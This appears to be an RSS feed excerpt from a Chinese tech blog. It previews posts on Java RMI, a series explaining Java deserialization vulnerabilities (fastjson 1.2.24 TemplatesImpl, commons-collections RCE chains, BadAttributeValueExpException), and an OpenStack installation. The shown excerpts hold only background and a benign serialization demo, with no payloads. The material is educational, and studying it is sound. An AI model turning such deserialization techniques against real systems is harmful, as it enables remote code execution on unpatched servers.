&lt;p>RMI 是 Remote Method Invocation 的缩写，中文含义为远程方法调用，即一个Java程序调用调用另一个Java程序暴露出来的方法。&lt;/p>
&lt;p>RMI 有三个概念：&lt;/p>
&lt;ul>
&lt;li>&lt;strong>Registry :&lt;/strong> 提供服务注册和服务获取，服务端将类名称，存放地址注册到Registry中，以供客户端获取。&lt;/li>
&lt;li>&lt;strong>Server :&lt;/strong> 远程方法的提供者。&lt;/li>
&lt;li>&lt;strong>Client :&lt;/strong> 远程方法的调用者。&lt;/li>
&lt;/ul>
&lt;p>远程方法的定义需要满足两个条件：&lt;/p>
&lt;ol>
&lt;li>实现 &lt;code>java.rmi.Remote&lt;/code>。&lt;/li>
&lt;li>继承 &lt;code>java.rmi.server.UnicastRemoteObject&lt;/code>。&lt;/li>
&lt;/ol>
&lt;h2 id="rmi-使用示例">RMI 使用示例&lt;/h2>
&lt;h3 id="registry">Registry&lt;/h3>
&lt;p>创建 Registry&lt;/p></description></item><item><title>Java 反序列化漏洞原理（三）fastjson 1.2.24 Templateslmpl 利用原理</title><link>https://www.typesafe.cn/posts/java-serialization-vulnerability-3/</link><pubDate>Thu, 21 Oct 2021 22:56:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/java-serialization-vulnerability-3/</guid><description>&lt;h2 id="声明">声明&lt;/h2>
&lt;p>本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。&lt;/p>
&lt;h2 id="fastjson-是什么">Fastjson 是什么&lt;/h2>
&lt;blockquote>
&lt;p>fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。&lt;/p>&lt;/blockquote>
&lt;blockquote>
&lt;p>fastjson相对其他JSON库的特点是快。fastjson在阿里巴巴大规模使用，在数万台服务器上部署，fastjson在业界被广泛接受。在2012年被开源中国评选为最受欢迎的国产开源软件之一。&lt;/p>&lt;/blockquote>
&lt;p>以上摘自Fastjson GitHub 介绍。&lt;/p>
&lt;p>但近年来随着 Fastjson 不断爆出漏洞，各大中小型公司都逐渐弃用 Fastjson ，甚至阿里自己开源的服务注册、配置管理平台 &lt;strong>NACOS&lt;/strong> 在 1.3.0 版本之后都从 Fastjson 替换为了 Jackson (详见 &lt;a href="https://github.com/alibaba/nacos/releases/tag/1.3.0">https://github.com/alibaba/nacos/releases/tag/1.3.0&lt;/a>) ，可见漏洞危害之大。&lt;/p>
&lt;h2 id="为什么会弃用-fastjson-">为什么会弃用 Fastjson ？&lt;/h2>
&lt;p>想要研究一个产品的漏洞其中有一条很好的途径就是去查询 CVE 编号，但是我在检索之后发现 Fastjson 只有 &lt;strong>CVE-2017-18349&lt;/strong> 这一条，而 Jackson 竟然有高达 76 条。&lt;/p>
&lt;p>这能否证明 Fastjson 比 Jackson 更安全呢？答案并不是，都是半斤八两，有些 Fastjson 里面出现的漏洞在 Jackson 里面也同样存在。&lt;/p>
&lt;p>那为什么会有公司弃用 Fastjson 呢？&lt;/p>
&lt;p>或许是 Jackson 有更完善且公开的漏洞管理机制，或许是国外的月亮比较圆，或许是随大流，也或许是 Fastjson 代码质量不过关（知乎上有很多回答批判 Fastjson 代码糟糕的），真实原因就不得而知了。&lt;/p>
&lt;p>尽管近年来有公司不断弃用 Fastjson ，但还有很多公司在使用，并且已经开发上线的系统想要替换或者升级 Fastjson 还需要时间，因此我们很有必要学习一下 Fastjson 漏洞的产因。&lt;/p>
&lt;h2 id="fastjson-漏洞产生原因">Fastjson 漏洞产生原因&lt;/h2>
&lt;p>Fastjson 第一次被爆出有漏洞是官方在2017年3月15日主动披露的，详见 &lt;a href="https://github.com/alibaba/fastjson/wiki/security_update_20170315">https://github.com/alibaba/fastjson/wiki/security_update_20170315&lt;/a> 。漏洞影响 1.2.24 以及之前的版本。我们今天来研究一下当 fastjson version &amp;lt;= 1.2.24 时漏洞是如何产生的。&lt;/p></description></item><item><title>Java 反序列化漏洞原理（二）新版本JDK利用方式和Shiro举例</title><link>https://www.typesafe.cn/posts/java-serialization-vulnerability-2/</link><pubDate>Sat, 16 Oct 2021 22:55:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/java-serialization-vulnerability-2/</guid><description>&lt;h2 id="声明">声明&lt;/h2>
&lt;p>本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。&lt;/p>
&lt;h2 id="新的希望">新的希望&lt;/h2>
&lt;h3 id="0x00">0x00&lt;/h3>
&lt;p>在上一节中我们介绍了 Java 反序列化漏洞的成因和利用 &lt;code>commons-collections 3.1&lt;/code> 搭配 &lt;code>sun.reflect.annotation.AnnotationInvocationHandler&lt;/code> 实现远程命令执行的方式。但&lt;code>sun.reflect.annotation.AnnotationInvocationHandler&lt;/code> 的问题已经在最新版 jdk 中修复，可利用范围仅能够局限于旧版本的jdk。经过安全人员的审计，另一个类 &lt;code>javax.management.BadAttributeValueExpException&lt;/code> 出现在了安全人员的视野。&lt;/p>
&lt;p>&lt;code>javax.management.BadAttributeValueExpException&lt;/code> 继承自 &lt;code>java.lang.Exception&lt;/code>，&lt;code>java.lang.Exception&lt;/code> 继承自 &lt;code>java.lang.Throwable&lt;/code>，而 &lt;code>java.lang.Throwable&lt;/code> 实现了 &lt;code>java.io.Serializable&lt;/code>。因此 &lt;code>javax.management.BadAttributeValueExpException&lt;/code> 符合了 &lt;strong>可序列化&lt;/strong> 这个要求，同样的它也增加了 &lt;code>readObject&lt;/code> 方法，这个类的完整代码如下：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">package&lt;/span> javax.management;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> java.io.IOException;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> java.io.ObjectInputStream;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4">/**
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> * Thrown when an invalid MBean attribute is passed to a query
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> * constructing method. This exception is used internally by JMX
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> * during the evaluation of a query. User code does not usually
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> * see it.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> *
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> * @since 1.5
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">class&lt;/span> &lt;span style="color:#50fa7b">BadAttributeValueExpException&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">extends&lt;/span> Exception {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6272a4">/* Serial version */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">private&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">static&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">final&lt;/span> &lt;span style="color:#8be9fd">long&lt;/span> serialVersionUID &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">-&lt;/span>3105272988410493376L;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6272a4">/**
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> * @serial A string representation of the attribute that originated this exception.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> * for example, the string value can be the return of {@code attribute.toString()}
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">private&lt;/span> Object val;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6272a4">/**
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> * Constructs a BadAttributeValueExpException using the specified Object to
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> * create the toString() value.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> *
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> * @param val the inappropriate value.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> &lt;span style="color:#50fa7b">BadAttributeValueExpException&lt;/span> (Object val) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">this&lt;/span>.&lt;span style="color:#50fa7b">val&lt;/span> &lt;span style="color:#ff79c6">=&lt;/span> val &lt;span style="color:#ff79c6">==&lt;/span> &lt;span style="color:#ff79c6">null&lt;/span> &lt;span style="color:#ff79c6">?&lt;/span> &lt;span style="color:#ff79c6">null&lt;/span> : val.&lt;span style="color:#50fa7b">toString&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6272a4">/**
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> * Returns the string representing the object.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> String &lt;span style="color:#50fa7b">toString&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">return&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;BadAttributeValueException: &amp;#34;&lt;/span> &lt;span style="color:#ff79c6">+&lt;/span> val;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">private&lt;/span> &lt;span style="color:#8be9fd">void&lt;/span> &lt;span style="color:#50fa7b">readObject&lt;/span>(ObjectInputStream ois) &lt;span style="color:#8be9fd;font-style:italic">throws&lt;/span> IOException, ClassNotFoundException {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ObjectInputStream.&lt;span style="color:#50fa7b">GetField&lt;/span> gf &lt;span style="color:#ff79c6">=&lt;/span> ois.&lt;span style="color:#50fa7b">readFields&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Object valObj &lt;span style="color:#ff79c6">=&lt;/span> gf.&lt;span style="color:#50fa7b">get&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;val&amp;#34;&lt;/span>, &lt;span style="color:#ff79c6">null&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">if&lt;/span> (valObj &lt;span style="color:#ff79c6">==&lt;/span> &lt;span style="color:#ff79c6">null&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> val &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">null&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#ff79c6">else&lt;/span> &lt;span style="color:#ff79c6">if&lt;/span> (valObj &lt;span style="color:#ff79c6">instanceof&lt;/span> String) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> val&lt;span style="color:#ff79c6">=&lt;/span> valObj;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#ff79c6">else&lt;/span> &lt;span style="color:#ff79c6">if&lt;/span> (System.&lt;span style="color:#50fa7b">getSecurityManager&lt;/span>() &lt;span style="color:#ff79c6">==&lt;/span> &lt;span style="color:#ff79c6">null&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">||&lt;/span> valObj &lt;span style="color:#ff79c6">instanceof&lt;/span> Long
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">||&lt;/span> valObj &lt;span style="color:#ff79c6">instanceof&lt;/span> Integer
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">||&lt;/span> valObj &lt;span style="color:#ff79c6">instanceof&lt;/span> Float
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">||&lt;/span> valObj &lt;span style="color:#ff79c6">instanceof&lt;/span> Double
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">||&lt;/span> valObj &lt;span style="color:#ff79c6">instanceof&lt;/span> Byte
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">||&lt;/span> valObj &lt;span style="color:#ff79c6">instanceof&lt;/span> Short
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">||&lt;/span> valObj &lt;span style="color:#ff79c6">instanceof&lt;/span> Boolean) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> val &lt;span style="color:#ff79c6">=&lt;/span> valObj.&lt;span style="color:#50fa7b">toString&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#ff79c6">else&lt;/span> { &lt;span style="color:#6272a4">// the serialized object is from a version without JDK-8019292 fix&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> val &lt;span style="color:#ff79c6">=&lt;/span> System.&lt;span style="color:#50fa7b">identityHashCode&lt;/span>(valObj) &lt;span style="color:#ff79c6">+&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;@&amp;#34;&lt;/span> &lt;span style="color:#ff79c6">+&lt;/span> valObj.&lt;span style="color:#50fa7b">getClass&lt;/span>().&lt;span style="color:#50fa7b">getName&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>小伙伴们可能会很迷茫，这要何从下手？&lt;/p></description></item><item><title>Java 反序列化漏洞原理（一）Serializable</title><link>https://www.typesafe.cn/posts/java-serialization-vulnerability-1/</link><pubDate>Thu, 14 Oct 2021 23:00:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/java-serialization-vulnerability-1/</guid><description>&lt;h2 id="声明">声明&lt;/h2>
&lt;p>本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。&lt;/p>
&lt;h2 id="序列化的定义">序列化的定义&lt;/h2>
&lt;p>序列化是指将数据结构或对象状态转换成可取用格式，以留待后续在相同或另一台计算机环境中，能恢复原先状态的过程。依照序列化格式重新获取字节的结果时，可以利用它来产生与原始对象相同语义的副本。&lt;/p>
&lt;h2 id="java-中的序列化">Java 中的序列化&lt;/h2>
&lt;p>Java 自身提供了序列化的功能，需要实现 &lt;code>java.io.Serializable&lt;/code> 接口，标明该对象是可序列化的。 &lt;code>java.io.Serializable&lt;/code> 是一个空接口，不需要对象实现方法。&lt;/p>
&lt;p>以下面这段代码为例，展示了一个对象的序列化和反序列化的过程。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> java.io.*;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> java.nio.charset.StandardCharsets;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> java.util.Base64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">class&lt;/span> &lt;span style="color:#50fa7b">Eval0&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">static&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">class&lt;/span> &lt;span style="color:#50fa7b">Command&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">implements&lt;/span> Serializable {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">private&lt;/span> String cmd;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> String &lt;span style="color:#50fa7b">getCmd&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">return&lt;/span> cmd;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> &lt;span style="color:#8be9fd">void&lt;/span> &lt;span style="color:#50fa7b">setCmd&lt;/span>(String cmd) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">this&lt;/span>.&lt;span style="color:#50fa7b">cmd&lt;/span> &lt;span style="color:#ff79c6">=&lt;/span> cmd;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">static&lt;/span> &lt;span style="color:#8be9fd">void&lt;/span> &lt;span style="color:#50fa7b">main&lt;/span>(String&lt;span style="color:#ff79c6">[]&lt;/span> args) &lt;span style="color:#8be9fd;font-style:italic">throws&lt;/span> Exception {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6272a4">// 定义一个对象&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Command command &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">new&lt;/span> Command();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> command.&lt;span style="color:#50fa7b">setCmd&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;calc&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> System.&lt;span style="color:#50fa7b">out&lt;/span>.&lt;span style="color:#50fa7b">println&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;序列化前: &amp;#34;&lt;/span> &lt;span style="color:#ff79c6">+&lt;/span> command.&lt;span style="color:#50fa7b">getCmd&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6272a4">// 将用户序列化为字节数组&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ByteArrayOutputStream buffer &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">new&lt;/span> ByteArrayOutputStream();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">try&lt;/span> (ObjectOutputStream outputStream &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">new&lt;/span> ObjectOutputStream(buffer)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> outputStream.&lt;span style="color:#50fa7b">writeObject&lt;/span>(command);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6272a4">// 将字节数组进行base64编码，无论是通过网络或者是文件都可以发送到另一个系统进行反序列化&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">final&lt;/span> String data &lt;span style="color:#ff79c6">=&lt;/span> Base64.&lt;span style="color:#50fa7b">getEncoder&lt;/span>().&lt;span style="color:#50fa7b">encodeToString&lt;/span>(buffer.&lt;span style="color:#50fa7b">toByteArray&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> System.&lt;span style="color:#50fa7b">out&lt;/span>.&lt;span style="color:#50fa7b">println&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;序列化后: &amp;#34;&lt;/span> &lt;span style="color:#ff79c6">+&lt;/span> data);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6272a4">// 将base64编码的数据再解码为字节数组&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">final&lt;/span> &lt;span style="color:#8be9fd">byte&lt;/span>&lt;span style="color:#ff79c6">[]&lt;/span> bytes &lt;span style="color:#ff79c6">=&lt;/span> Base64.&lt;span style="color:#50fa7b">getDecoder&lt;/span>().&lt;span style="color:#50fa7b">decode&lt;/span>(data.&lt;span style="color:#50fa7b">getBytes&lt;/span>(StandardCharsets.&lt;span style="color:#50fa7b">UTF_8&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6272a4">// 将字节数组反序列化为对象&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ByteArrayInputStream b &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">new&lt;/span> ByteArrayInputStream(bytes);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">try&lt;/span> (ObjectInputStream input &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">new&lt;/span> ObjectInputStream(b)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">final&lt;/span> Command obj &lt;span style="color:#ff79c6">=&lt;/span> (Command) input.&lt;span style="color:#50fa7b">readObject&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> System.&lt;span style="color:#50fa7b">out&lt;/span>.&lt;span style="color:#50fa7b">println&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;反序列化: &amp;#34;&lt;/span> &lt;span style="color:#ff79c6">+&lt;/span> obj.&lt;span style="color:#50fa7b">getCmd&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>运行后输出：&lt;/p></description></item><item><title>openstack victoria版安装</title><link>https://www.typesafe.cn/posts/install-openstack-victoria/</link><pubDate>Sat, 12 Jun 2021 00:00:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/install-openstack-victoria/</guid><description>&lt;p>近期公司业务需求，需要安装一套Openstack环境学习，看了一下现在已经出了&lt;code>wallaby&lt;/code>版了，我果断选择了上一个版本&lt;code>victoria&lt;/code>。因为没有足够多的物理服务器了，只好找了一台64核256G内存6T硬盘的机器来创建几台虚拟机来搭环境了。&lt;/p>
&lt;h1 id="实验环境">实验环境&lt;/h1>
&lt;p>此次实验使用到了三台虚拟机，都是使用centos8系统，一台机器当作控制和网络节点，另外两台当作计算节点，使用OVS+VLAN的网络模式，eth0作为管理网络，eth1互相连接到OVS网桥上模拟trunk网卡，controller多增加一个eth2用于访问外部网络。&lt;/p>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>节点&lt;/th>
 &lt;th>作用&lt;/th>
 &lt;th>eth0&lt;/th>
 &lt;th>eth1&lt;/th>
 &lt;th>eth2&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>controller&lt;/td>
 &lt;td>控制节点、网络节点&lt;/td>
 &lt;td>172.16.10.100&lt;/td>
 &lt;td>无IP&lt;/td>
 &lt;td>桥接，无IP&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>compute-101&lt;/td>
 &lt;td>计算节点&lt;/td>
 &lt;td>172.16.10.101&lt;/td>
 &lt;td>无IP&lt;/td>
 &lt;td>❌&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>compute-102&lt;/td>
 &lt;td>计算节点&lt;/td>
 &lt;td>172.16.10.102&lt;/td>
 &lt;td>无IP&lt;/td>
 &lt;td>❌&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h1 id="安装虚拟机">安装虚拟机&lt;/h1>
&lt;h2 id="安装依赖">安装依赖&lt;/h2>
&lt;p>安装KVM和Linux网桥&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>yum install -y qemu-kvm libvirt virt-install bridge-utils virt-manager dejavu-lgc-sans-fonts
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;blockquote>
&lt;p>&lt;code>dejavu-lgc-sans-fonts&lt;/code>用于解决 &lt;code>virt-manaer&lt;/code> 乱码&lt;/p>&lt;/blockquote>
&lt;p>启动&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>systemctl &lt;span style="color:#8be9fd;font-style:italic">enable&lt;/span> libvirtd &lt;span style="color:#ff79c6">&amp;amp;&amp;amp;&lt;/span> systemctl start libvirtd
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>安装OVS&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>yum install openvswitch
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>启动OVS&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>systemctl &lt;span style="color:#8be9fd;font-style:italic">enable&lt;/span> openvswitch &lt;span style="color:#ff79c6">&amp;amp;&amp;amp;&lt;/span> systemctl start openvswitch
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="创建虚拟机">创建虚拟机&lt;/h3>
&lt;p>使用 virt-manager 创建三台虚拟机&lt;/p>
&lt;p>&lt;img src="https://oss.typesafe.cn/vm-nodes.png" alt="image-20210604140054913">&lt;/p>
&lt;h3 id="配置网络">配置网络&lt;/h3>
&lt;h4 id="配置管理网卡">配置管理网卡&lt;/h4>
